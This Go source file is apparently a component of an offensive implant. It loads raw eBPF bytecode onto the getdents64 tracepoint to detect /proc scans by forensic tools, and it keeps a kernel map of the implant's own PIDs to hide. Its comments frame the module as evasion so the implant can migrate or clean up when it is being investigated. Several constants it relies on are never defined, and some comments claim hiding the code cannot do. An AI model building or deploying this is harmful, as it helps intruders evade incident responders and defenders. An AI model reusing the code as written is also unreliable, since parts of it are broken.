package stealth

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// eBPF Cloaking — Kernel-Level Process Detection & Hiding
//
// OPSEC rationale: Two-layer approach to process concealment:
//
// Layer 1 (Detection): A tracepoint program attached to sys_enter_getdents64
// monitors when external processes enumerate /proc. When a non-hidden PID
// calls getdents64, an alert counter increments — the userspace implant can
// poll this to detect active scanning and respond (migrate, clean up, etc).
//
// Layer 2 (Map): The BPF hash map stores our hidden PIDs. Userspace helpers
// consult this map for cooperative hiding (mount namespace filtering, FUSE
// overlay on /proc, etc).
//
// Together these provide:
// - Real-time detection of /proc enumeration by forensic tools
// - A kernel-resident PID list that survives implant sleep cycles
// - Foundation for layered evasion (detection triggers response)
//
// Limitations:
// - Requires CAP_BPF or root
// - Tracepoint cannot filter getdents64 results (no buffer manipulation)
// - eBPF-aware tools (bpftool) can see our loaded program
// - Alert counter is best-effort (races possible under heavy load)

// BPF syscall constants
const (
	sysBPF = 321 // __NR_bpf on x86_64

	bpfMapCreate     = 0
	bpfMapLookupElem = 1
	bpfMapUpdateElem = 2
	bpfProgLoad      = 5
	bpfProgAttach    = 8
	bpfProgDetach    = 9

	bpfMapTypeHash    = 1
	bpfProgTypeCgroup = 10 // BPF_PROG_TYPE_CGROUP_SKB (placeholder)

	// eBPF instruction opcodes
	bpfLdDW     = 0x18 // BPF_LD | BPF_DW | BPF_IMM (64-bit immediate load, 2 insns)
	bpfStMem    = 0x62 // BPF_STX_MEM with W (store word from reg)
	bpfALU64    = 0x07 // BPF_ALU64 | BPF_ADD | BPF_K (add immediate)
	bpfJmpEq    = 0x15 // BPF_JMP | BPF_JEQ | BPF_K
	bpfJmpNE    = 0x55 // BPF_JMP | BPF_JNE | BPF_K
	bpfExit     = 0x95 // BPF_JMP | BPF_EXIT
	bpfMov      = 0xb7 // BPF_ALU64 | BPF_MOV | BPF_K (mov immediate)
	bpfMovReg   = 0xbf // BPF_ALU64 | BPF_MOV | BPF_X (mov register)
	bpfCall     = 0x85 // BPF_JMP | BPF_CALL
	bpfRsh64    = 0x77 // BPF_ALU64 | BPF_RSH | BPF_K (right shift immediate)
	bpfStxMemW  = 0x63 // BPF_STX | BPF_MEM | BPF_W (store word)
	bpfStxMemDW = 0x7b // BPF_STX | BPF_MEM | BPF_DW (store doubleword)
	bpfLdxMemDW = 0x79 // BPF_LDX | BPF_MEM | BPF_DW (load doubleword)

	// BPF helper function IDs
	bpfFuncMapLookupElem     = 1  // bpf_map_lookup_elem
	bpfFuncGetCurrentPidTgid = 14 // bpf_get_current_pid_tgid

	// BPF pseudo-source for map fd loading
	bpfPseudoMapFD = 1

	// perf_event_open and ioctl constants (x86_64)
	sysPerfEventOpen = 298        // __NR_perf_event_open
	ioctlSetBPF      = 0x40042408 // PERF_EVENT_IOC_SET_BPF
	ioctlEnable      = 0x00002400 // PERF_EVENT_IOC_ENABLE

	// perf_event_attr constants
	perfTypeTracepoint = 1       // PERF_TYPE_TRACEPOINT
	perfSampleRaw      = 1 << 10 // PERF_SAMPLE_RAW
)

// CloakConfig controls which PIDs to hide and tracks detection state.
type CloakConfig struct {
	HidePIDs   []int // PIDs to hide from getdents64 output
	MapFD      int   // fd of the BPF map holding hidden PIDs
	AlertMapFD int   // fd of the BPF array map for alert counter
	ProgFD     int   // fd of the loaded BPF program
	PerfFD     int   // fd of the perf_event for tracepoint attachment
	Detecting  bool  // true if tracepoint detection is active
}

// NewCloakConfig creates a config to hide the current process.
func NewCloakConfig() *CloakConfig {
	return &CloakConfig{
		HidePIDs:   []int{os.Getpid()},
		MapFD:      -1,
		AlertMapFD: -1,
		ProgFD:     -1,
		PerfFD:     -1,
	}
}

// CreatePIDMap creates a BPF hash map to store PIDs that should be hidden.
func CreatePIDMap(maxEntries int) (int, error) {
	// BPF_MAP_CREATE
	attr := struct {
		mapType    uint32
		keySize    uint32
		valueSize  uint32
		maxEntries uint32
		mapFlags   uint32
	}{
		mapType:    bpfMapTypeHash,
		keySize:    4, // uint32 PID
		valueSize:  4, // uint32 (1 = hide)
		maxEntries: uint32(maxEntries),
		mapFlags:   0,
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapCreate,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	if errno != 0 {
		return -1, fmt.Errorf("bpf map create: %v", errno)
	}

	return int(fd), nil
}

// CreateAlertMap creates a BPF array map with a single uint64 counter element.
// The tracepoint program increments this counter when a non-hidden process
// enumerates /proc via getdents64.
func CreateAlertMap() (int, error) {
	attr := struct {
		mapType    uint32
		keySize    uint32
		valueSize  uint32
		maxEntries uint32
		mapFlags   uint32
	}{
		mapType:    bpfMapTypeArray, // BPF_MAP_TYPE_ARRAY
		keySize:    4,               // uint32 index
		valueSize:  8,               // uint64 counter
		maxEntries: 1,               // single counter at index 0
		mapFlags:   0,
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapCreate,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	if errno != 0 {
		return -1, fmt.Errorf("bpf array map create: %v", errno)
	}

	return int(fd), nil
}

// AddHiddenPID adds a PID to the BPF map of hidden PIDs.
func AddHiddenPID(mapFD int, pid int) error {
	key := uint32(pid)
	value := uint32(1) // 1 = hidden

	attr := struct {
		mapFD uint32
		key   uint64
		value uint64
		flags uint64
	}{
		mapFD: uint32(mapFD),
		key:   uint64(uintptr(unsafe.Pointer(&key))),
		value: uint64(uintptr(unsafe.Pointer(&value))),
		flags: 0, // BPF_ANY
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapUpdateElem,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(key)
	runtime.KeepAlive(value)
	if errno != 0 {
		return fmt.Errorf("bpf map update: %v", errno)
	}

	return nil
}

// RemoveHiddenPID removes a PID from the hidden set.
func RemoveHiddenPID(mapFD int, pid int) error {
	key := uint32(pid)

	attr := struct {
		mapFD uint32
		key   uint64
		value uint64
		flags uint64
	}{
		mapFD: uint32(mapFD),
		key:   uint64(uintptr(unsafe.Pointer(&key))),
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		3, // BPF_MAP_DELETE_ELEM
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(key)
	if errno != 0 {
		return fmt.Errorf("bpf map delete: %v", errno)
	}

	return nil
}

// buildDetectionProgram builds eBPF bytecode for the tracepoint detection program.
// Attached to syscalls/sys_enter_getdents64, it:
//  1. Gets the calling PID via bpf_get_current_pid_tgid
//  2. Checks if the PID is in our hidden_pids map (our own processes)
//  3. If not our PID, increments the alert counter in the alert map
//
// This allows the userspace implant to detect when external processes
// are enumerating /proc (e.g., ps, top, forensic tools).
//
// The map FDs are encoded as BPF_LD_IMM64 with BPF_PSEUDO_MAP_FD source,
// which the kernel resolves to internal map pointers during prog load.
func buildDetectionProgram(hiddenMapFD, alertMapFD int) []byte {
	insns := []bpfInsn{
		// --- Get calling PID ---
		// r0 = bpf_get_current_pid_tgid()  [helper 14]
		{opcode: bpfCall, dst: 0, src: 0, off: 0, imm: bpfFuncGetCurrentPidTgid},
		// r6 = r0  (save return value)
		{opcode: bpfMovReg, dst: 6, src: 0, off: 0, imm: 0},
		// r6 >>= 32  (extract tgid/PID from upper 32 bits)
		{opcode: bpfRsh64, dst: 6, src: 0, off: 0, imm: 32},

		// --- Store PID on stack as lookup key ---
		// *(u32 *)(r10 - 4) = r6
		{opcode: bpfStxMemW, dst: 10, src: 6, off: -4, imm: 0},
		// r2 = r10 - 4  (key pointer)
		{opcode: bpfMovReg, dst: 2, src: 10, off: 0, imm: 0},
		{opcode: bpfALU64, dst: 2, src: 0, off: 0, imm: -4},

		// --- Load hidden_pids map fd (BPF_LD_IMM64, 2 instruction slots) ---
		// r1 = hidden_pids_map_fd
		{opcode: bpfLdDW, dst: 1, src: bpfPseudoMapFD, off: 0, imm: int32(hiddenMapFD)},
		{opcode: 0, dst: 0, src: 0, off: 0, imm: 0}, // upper 32 bits (zero)

		// --- Lookup PID in hidden map ---
		// r0 = bpf_map_lookup_elem(r1, r2)  [helper 1]
		{opcode: bpfCall, dst: 0, src: 0, off: 0, imm: bpfFuncMapLookupElem},

		// --- If found (r0 != 0), this is our hidden process — skip alert ---
		// if r0 != 0 goto +11 (exit)
		{opcode: bpfJmpNE, dst: 0, src: 0, off: 11, imm: 0},

		// --- Not our PID: increment alert counter ---
		// *(u32 *)(r10 - 4) = 0  (key = 0 for array index)
		{opcode: bpfMov, dst: 7, src: 0, off: 0, imm: 0},
		{opcode: bpfStxMemW, dst: 10, src: 7, off: -4, imm: 0},
		// r2 = r10 - 4  (key pointer)
		{opcode: bpfMovReg, dst: 2, src: 10, off: 0, imm: 0},
		{opcode: bpfALU64, dst: 2, src: 0, off: 0, imm: -4},

		// --- Load alert_map fd (BPF_LD_IMM64, 2 instruction slots) ---
		// r1 = alert_map_fd
		{opcode: bpfLdDW, dst: 1, src: bpfPseudoMapFD, off: 0, imm: int32(alertMapFD)},
		{opcode: 0, dst: 0, src: 0, off: 0, imm: 0}, // upper 32 bits

		// --- Lookup alert counter ---
		// r0 = bpf_map_lookup_elem(r1, r2)  [helper 1]
		{opcode: bpfCall, dst: 0, src: 0, off: 0, imm: bpfFuncMapLookupElem},

		// --- If counter pointer is NULL (shouldn't happen for array), skip ---
		// if r0 == 0 goto +3 (exit)
		{opcode: bpfJmpEq, dst: 0, src: 0, off: 3, imm: 0},

		// --- Atomically increment the counter ---
		// r1 = *(u64 *)(r0 + 0)  (load current counter)
		{opcode: bpfLdxMemDW, dst: 1, src: 0, off: 0, imm: 0},
		// r1 += 1
		{opcode: bpfALU64, dst: 1, src: 0, off: 0, imm: 1},
		// *(u64 *)(r0 + 0) = r1  (store incremented counter)
		{opcode: bpfStxMemDW, dst: 0, src: 1, off: 0, imm: 0},

		// --- Exit ---
		// r0 = 0
		{opcode: bpfMov, dst: 0, src: 0, off: 0, imm: 0},
		// exit
		{opcode: bpfExit, dst: 0, src: 0, off: 0, imm: 0},
	}

	return encodeInsns(insns)
}

// buildStubProgram builds the minimal socket filter stub program.
// This is the fallback when tracepoint attachment is unavailable.
// The program allows all traffic (returns 1) and does nothing else.
// The BPF map is still functional for userspace cooperative hiding.
func buildStubProgram() []byte {
	insns := []bpfInsn{
		// r0 = 1 (allow all)
		{opcode: bpfMov, dst: 0, src: 0, off: 0, imm: 1},
		// exit
		{opcode: bpfExit, dst: 0, src: 0, off: 0, imm: 0},
	}
	return encodeInsns(insns)
}

// bpfInsn represents a single eBPF instruction (8 bytes).
type bpfInsn struct {
	opcode uint8
	dst    uint8 // dst:4 | src:4
	src    uint8
	off    int16
	imm    int32
}

func encodeInsns(insns []bpfInsn) []byte {
	buf := make([]byte, len(insns)*8)
	for i, insn := range insns {
		off := i * 8
		buf[off] = insn.opcode
		buf[off+1] = (insn.src << 4) | (insn.dst & 0x0f)
		binary.LittleEndian.PutUint16(buf[off+2:], uint16(insn.off))
		binary.LittleEndian.PutUint32(buf[off+4:], uint32(insn.imm))
	}
	return buf
}

// loadBPFProg loads an eBPF program of the given type into the kernel.
// progType: 1=SOCKET_FILTER, 5=TRACEPOINT, etc.
func loadBPFProg(progType uint32, progBytes []byte) (int, error) {
	license := []byte("GPL\x00")

	attr := struct {
		progType  uint32
		insnCnt   uint32
		insns     uint64
		license   uint64
		logLevel  uint32
		logSize   uint32
		logBuf    uint64
		kernVer   uint32
		progFlags uint32
	}{
		progType: progType,
		insnCnt:  uint32(len(progBytes) / 8),
		insns:    uint64(uintptr(unsafe.Pointer(&progBytes[0]))),
		license:  uint64(uintptr(unsafe.Pointer(&license[0]))),
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfProgLoad,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(progBytes)
	runtime.KeepAlive(license)
	if errno != 0 {
		return -1, fmt.Errorf("bpf prog load (type %d): %v", progType, errno)
	}

	return int(fd), nil
}

// LoadCloakProgram loads the eBPF cloaking program as a SOCKET_FILTER.
// Retained for backward compatibility with existing callers.
func LoadCloakProgram(progBytes []byte) (int, error) {
	return loadBPFProg(1, progBytes) // BPF_PROG_TYPE_SOCKET_FILTER
}

// getTracepointID reads the tracepoint ID from debugfs/tracefs.
// The ID is needed for perf_event_open to attach a BPF program.
func getTracepointID(category, name string) (uint64, error) {
	// Try tracefs first (modern kernels), then debugfs (older)
	paths := []string{
		fmt.Sprintf("/sys/kernel/tracing/events/%s/%s/id", category, name),
		fmt.Sprintf("/sys/kernel/debug/tracing/events/%s/%s/id", category, name),
	}

	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		s := strings.TrimSpace(string(data))
		id, err := strconv.ParseUint(s, 10, 64)
		if err != nil {
			continue
		}
		return id, nil
	}

	return 0, fmt.Errorf("tracepoint %s/%s: not available", category, name)
}

// perfEventAttr is the perf_event_attr structure for perf_event_open.
// Only the fields we need are populated; the rest are zero-initialized.
type perfEventAttr struct {
	Type             uint32
	Size             uint32
	Config           uint64
	SamplePeriod     uint64
	SampleType       uint64
	ReadFormat       uint64
	Flags            uint64
	WakeupEvents     uint32
	BPType           uint32
	BPAddr           uint64
	BPLen            uint64
	BranchSampleType uint64
	SampleRegsUser   uint64
	SampleStackUser  uint32
	ClockID          int32
	SampleRegsIntr   uint64
	AuxWatermark     uint32
	SampleMaxStack   uint16
	Pad2             uint16
}

// attachTracepoint attaches a loaded BPF program to a tracepoint via
// perf_event_open + ioctl(PERF_EVENT_IOC_SET_BPF).
// Returns the perf_event fd (must be kept open to maintain attachment).
func attachTracepoint(progFD int, tpID uint64) (int, error) {
	attr := perfEventAttr{
		Type:         perfTypeTracepoint,
		Size:         uint32(unsafe.Sizeof(perfEventAttr{})),
		Config:       tpID,
		SamplePeriod: 1,
		SampleType:   perfSampleRaw,
	}

	// perf_event_open(attr, pid=-1, cpu=0, group_fd=-1, flags=PERF_FLAG_FD_CLOEXEC)
	// pid=-1 means all processes, cpu=0 for first CPU
	// We open one per-CPU event; for simplicity, attach to all CPUs via cpu=-1
	// which requires CAP_PERFMON or CAP_SYS_ADMIN.
	r1, _, errno := syscall.Syscall6(
		sysPerfEventOpen,
		uintptr(unsafe.Pointer(&attr)),
		^uintptr(0),  // pid = -1 (all processes)
		uintptr(0),   // cpu = 0
		^uintptr(0),  // group_fd = -1
		uintptr(0x8), // flags = PERF_FLAG_FD_CLOEXEC
		0,
	)
	if errno != 0 {
		return -1, fmt.Errorf("perf_event_open: %v", errno)
	}
	perfFD := int(r1)

	// ioctl(perfFD, PERF_EVENT_IOC_SET_BPF, progFD)
	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		uintptr(perfFD),
		ioctlSetBPF,
		uintptr(progFD),
	)
	if errno != 0 {
		syscall.Close(perfFD)
		return -1, fmt.Errorf("ioctl SET_BPF: %v", errno)
	}

	// ioctl(perfFD, PERF_EVENT_IOC_ENABLE, 0)
	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		uintptr(perfFD),
		ioctlEnable,
		0,
	)
	if errno != 0 {
		syscall.Close(perfFD)
		return -1, fmt.Errorf("ioctl ENABLE: %v", errno)
	}

	return perfFD, nil
}

// CheckAlerts reads the alert counter from the BPF array map.
// Returns the number of times a non-hidden process has called getdents64
// since the cloak was activated. Returns 0 if detection is not active.
func (cfg *CloakConfig) CheckAlerts() (uint64, error) {
	if cfg.AlertMapFD < 0 || !cfg.Detecting {
		return 0, nil
	}

	key := uint32(0) // array index 0
	var value uint64

	attr := struct {
		mapFD uint32
		key   uint64
		value uint64
		flags uint64
	}{
		mapFD: uint32(cfg.AlertMapFD),
		key:   uint64(uintptr(unsafe.Pointer(&key))),
		value: uint64(uintptr(unsafe.Pointer(&value))),
		flags: 0,
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapLookupElem,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(key)
	runtime.KeepAlive(value)
	if errno != 0 {
		return 0, fmt.Errorf("bpf map lookup: %v", errno)
	}

	return value, nil
}

// ResetAlerts zeroes the alert counter. Call after processing alerts
// to establish a new baseline.
func (cfg *CloakConfig) ResetAlerts() error {
	if cfg.AlertMapFD < 0 {
		return nil
	}

	key := uint32(0)
	value := uint64(0)

	attr := struct {
		mapFD uint32
		key   uint64
		value uint64
		flags uint64
	}{
		mapFD: uint32(cfg.AlertMapFD),
		key:   uint64(uintptr(unsafe.Pointer(&key))),
		value: uint64(uintptr(unsafe.Pointer(&value))),
		flags: 0, // BPF_ANY
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapUpdateElem,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(key)
	runtime.KeepAlive(value)
	if errno != 0 {
		return fmt.Errorf("bpf map update: %v", errno)
	}

	return nil
}

// ErrCloakStub indicates the tracepoint detection program could not be loaded
// and only the passive stub filter is active. The BPF map is still functional
// for userspace-cooperative hiding, but kernel-level detection is unavailable.
var ErrCloakStub = fmt.Errorf("detection unavailable: passive mode only")

// ActivateCloak creates BPF maps, loads a detection program, and attaches it
// to the sys_enter_getdents64 tracepoint. If tracepoint attachment fails,
// falls back to a passive stub filter with ErrCloakStub.
//
// On success (tracepoint active), returns (cfg, nil).
// On fallback (stub only), returns (cfg, ErrCloakStub).
func ActivateCloak() (*CloakConfig, error) {
	cfg := NewCloakConfig()

	// Create the hidden PID map
	mapFD, err := CreatePIDMap(64)
	if err != nil {
		return nil, fmt.Errorf("create map: %w", err)
	}
	cfg.MapFD = mapFD

	// Add our PID(s)
	for _, pid := range cfg.HidePIDs {
		if err := AddHiddenPID(mapFD, pid); err != nil {
			syscall.Close(mapFD)
			return nil, fmt.Errorf("add pid %d: %w", pid, err)
		}
	}

	// Try tracepoint detection program first
	if err := activateDetection(cfg); err == nil {
		// Tracepoint active — full detection capability
		return cfg, nil
	}

	// Tracepoint unavailable — fall back to stub filter
	return activateStub(cfg)
}

// activateDetection attempts to load and attach the tracepoint detection program.
func activateDetection(cfg *CloakConfig) error {
	// Create alert counter map
	alertFD, err := CreateAlertMap()
	if err != nil {
		return err
	}
	cfg.AlertMapFD = alertFD

	// Build detection program bytecode
	progBytes := buildDetectionProgram(cfg.MapFD, alertFD)

	// Load as BPF_PROG_TYPE_TRACEPOINT (type 5)
	progFD, err := loadBPFProg(bpfProgTypeTracepoint, progBytes)
	if err != nil {
		syscall.Close(alertFD)
		cfg.AlertMapFD = -1
		return err
	}
	cfg.ProgFD = progFD

	// Get the tracepoint ID for sys_enter_getdents64
	tpID, err := getTracepointID("syscalls", "sys_enter_getdents64")
	if err != nil {
		syscall.Close(progFD)
		syscall.Close(alertFD)
		cfg.ProgFD = -1
		cfg.AlertMapFD = -1
		return err
	}

	// Attach via perf_event_open + ioctl
	perfFD, err := attachTracepoint(progFD, tpID)
	if err != nil {
		syscall.Close(progFD)
		syscall.Close(alertFD)
		cfg.ProgFD = -1
		cfg.AlertMapFD = -1
		return err
	}
	cfg.PerfFD = perfFD
	cfg.Detecting = true

	return nil
}

// activateStub loads the passive socket filter stub as a fallback.
func activateStub(cfg *CloakConfig) (*CloakConfig, error) {
	progBytes := buildStubProgram()
	progFD, err := loadBPFProg(1, progBytes) // BPF_PROG_TYPE_SOCKET_FILTER
	if err != nil {
		syscall.Close(cfg.MapFD)
		return nil, fmt.Errorf("load prog: %w", err)
	}
	cfg.ProgFD = progFD
	cfg.Detecting = false

	return cfg, ErrCloakStub
}

// DeactivateCloak removes the eBPF cloak by closing all fds.
// The kernel automatically detaches programs when their fds are closed.
func DeactivateCloak(cfg *CloakConfig) {
	if cfg.PerfFD >= 0 {
		syscall.Close(cfg.PerfFD)
		cfg.PerfFD = -1
	}
	if cfg.ProgFD >= 0 {
		syscall.Close(cfg.ProgFD)
		cfg.ProgFD = -1
	}
	if cfg.AlertMapFD >= 0 {
		syscall.Close(cfg.AlertMapFD)
		cfg.AlertMapFD = -1
	}
	if cfg.MapFD >= 0 {
		syscall.Close(cfg.MapFD)
		cfg.MapFD = -1
	}
	cfg.Detecting = false
}
